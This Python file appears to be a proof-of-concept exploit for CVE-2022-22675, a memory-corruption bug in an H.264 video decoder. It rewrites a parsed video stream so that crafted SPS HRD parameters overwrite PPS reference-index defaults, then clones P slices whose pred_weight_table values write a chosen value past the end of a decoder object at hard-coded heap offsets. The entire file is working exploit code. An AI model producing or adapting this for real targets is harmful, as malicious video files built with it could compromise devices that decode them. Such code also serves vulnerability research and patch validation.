def cve_2022_22675(ds):
  from helpers import new_vui_parameter, new_hrd_parameter, clone_and_append_existing_slice
  import math

  # This is the offset from the start of the context
  # - Object size is    0x8642b0
  # - Allocated size is 0x868000
  offset = 0x868000
  # Keep this even with no uint16 in the range [0x0000, 0x007f]
  message_hex = "deadbeef"

  message_snippets = [int(message_hex[i:i+4], 16) for i in range(0, len(message_hex), 4)][::-1]

  print("\t Writing '0x{}' at furthest offset location 0x{:x}".format(message_hex, offset))

  #####
  # Step 1. Use parseHRD overwrite to change the default num_ref_idx value
  #####

  # We need this flag enabled to go into second overwrite
  ds["ppses"][0]["weighted_pred_flag"] = True

  # Prepare our overwriting SPS
  sps_idx = 1 # We target the 2nd SPS
  cpb_cnt_minus1 = 68 # This value is limited to 255; we set it to 68 for targeting
  ref_idx_overwrite_idx = 68 # First index where we overwrite the num_ref_idx_l0_default_active_minus1
  num_ref_idx_payload = 0xff

  ds["spses"][sps_idx]["seq_parameter_set_id"] = 31
  ds["spses"][sps_idx]["vui_parameters_present_flag"] = True
  ds["spses"][sps_idx]["vui_parameters"] = new_vui_parameter()

  # To maximize our overwrite, we focus on VCL HRD parameters, given it is closest to the end of the object
  ds["spses"][sps_idx]["vui_parameters"]["vcl_hrd_parameters_present_flag"] = True
  ds["spses"][sps_idx]["vui_parameters"]["vcl_hrd_parameters"] = new_hrd_parameter()
  ds["spses"][sps_idx]["vui_parameters"]["vcl_hrd_parameters"]["cpb_cnt_minus1"] = cpb_cnt_minus1
  # Fill up with junk and we will write over what values matter
  ds["spses"][sps_idx]["vui_parameters"]["vcl_hrd_parameters"]["bit_rate_value_minus1"] = [i for i in range(cpb_cnt_minus1+1)]
  ds["spses"][sps_idx]["vui_parameters"]["vcl_hrd_parameters"]["cpb_size_values_minus1"] = [i + cpb_cnt_minus1+1 for i in range(cpb_cnt_minus1+1)]
  ds["spses"][sps_idx]["vui_parameters"]["vcl_hrd_parameters"]["cbr_flag"] = [False] * (cpb_cnt_minus1+1)
  ds["spses"][sps_idx]["vui_parameters"]["vcl_hrd_parameters"]["cbr_flag"][ref_idx_overwrite_idx-5] = True  # PPS Entropy encoding
  pps_tgt_payload0 = num_ref_idx_payload << 16 # bottom byte is num_ref_idx_l0_default_active_minus1
  pps_tgt_payload0 |= num_ref_idx_payload << 8 # top byte is num_ref_idx_l1_default_active_minus1
  pps_tgt_payload0 |= int(ds["ppses"][0]["weighted_pred_flag"]) << 24 # value is a byte
  ds["spses"][sps_idx]["vui_parameters"]["vcl_hrd_parameters"]["cpb_size_values_minus1"][ref_idx_overwrite_idx] = pps_tgt_payload0

  #####
  # Step 2. Prepare for our second overwrite in pred_weight_table decoding
  #####

  # Set all slices to IDR slices to avoid "missing Keyframe" error
  for i in range(len(ds["nalu_headers"])):
    if ds["nalu_headers"][i]["nal_unit_type"] == 1:
      ds["nalu_headers"][i]["nal_unit_type"] = 5

  print("\t Need {} P slices to write the message 0x{}".format(len(message_snippets), message_hex))

  nalu_idx = 4 # Our video is SPS, PPS, SPS, I, P so we copy index 4
  slice_idx = 1 # We want the P slice to be copied
  while len(ds["slices"]) <= len(message_snippets):
    ds = clone_and_append_existing_slice(ds, nalu_idx, slice_idx)

  #####
  # Step 3. Modify relevant slices to write our target message
  #####
  for i in range(1, len(ds["slices"])):
    ds["slices"][i]["sh"]["num_ref_idx_active_override_flag"] = False
    avcusercontext_offset = offset # This will write right next to our previous write
    offset_from_slice = avcusercontext_offset - 0x374d4 # this constant is the start of the Slice offset
    chroma_offset_overwrite_num = (offset_from_slice - 0x206)//4 # 0x206 is the offset from the start of the slice;
    slice_num_ref_idx_payload = chroma_offset_overwrite_num + (1-i)//2 + int(math.ceil(len(message_hex)/8.0))

    print("\t Message will be at chroma_offset_l0[{}]".format(slice_num_ref_idx_payload))

    # If we have an odd number of 'short' types we want to write,
    # and if we're writing the lower end of bytes, we need to
    # slightly recalibrate where we write
    if len(ds["slices"]) % 2 == 0 and i % 2 == 0:
      slice_num_ref_idx_payload -= 1
    ds["slices"][i]["sh"]["num_ref_idx_l0_active_minus1"] = slice_num_ref_idx_payload
    ds["slices"][i]["sh"]["luma_log2_weight_denom"] = 0 # 1 << X is stored
    ds["slices"][i]["sh"]["chroma_log2_weight_denom"] = 0 # 1 << X is stored
    ds["slices"][i]["sh"]["luma_weight_l0_flag"] = [False] * (slice_num_ref_idx_payload+1)

    # on the device, this is shifted by the sps.bit_depth_luma_value_minus8
    ds["slices"][i]["sh"]["luma_weight_l0"] = [0] * (slice_num_ref_idx_payload+1)
    ds["slices"][i]["sh"]["luma_offset_l0"] = [0] * (slice_num_ref_idx_payload+1)
    ds["slices"][i]["sh"]["chroma_weight_l0_flag"] = [False] * (slice_num_ref_idx_payload+1)

    # on the device, this is shifted by the sps.bit_depth_chroma_value_minus8
    ds["slices"][i]["sh"]["chroma_weight_l0"] = [[0, 0]] * (slice_num_ref_idx_payload+1)
    ds["slices"][i]["sh"]["chroma_offset_l0"] = [[0, 0]] * (slice_num_ref_idx_payload+1)

    # The location we're overwriting
    ds["slices"][i]["sh"]["chroma_weight_l0_flag"][slice_num_ref_idx_payload] = True
    ds["slices"][i]["sh"]["chroma_weight_l0"][slice_num_ref_idx_payload] = [0x64+i, 0x65+i]

    # Our target overwrite location
    if len(ds["slices"]) % 2 == 1: # We are writing an even number of shorts
      if i % 2 == 1:
        ds["slices"][i]["sh"]["chroma_offset_l0"][slice_num_ref_idx_payload] = [message_snippets[i], 0x20]
      else:
        ds["slices"][i]["sh"]["chroma_offset_l0"][slice_num_ref_idx_payload] = [0x21, message_snippets[i-2]]
    else: # odd number of short values
      if i % 2 == 0:
        ds["slices"][i]["sh"]["chroma_offset_l0"][slice_num_ref_idx_payload] = [0x20, message_snippets[i-1]]
      else:
        ds["slices"][i]["sh"]["chroma_offset_l0"][slice_num_ref_idx_payload] = [message_snippets[i-1], 0x21]
  return ds


def modify_video(ds):
  return cve_2022_22675(ds)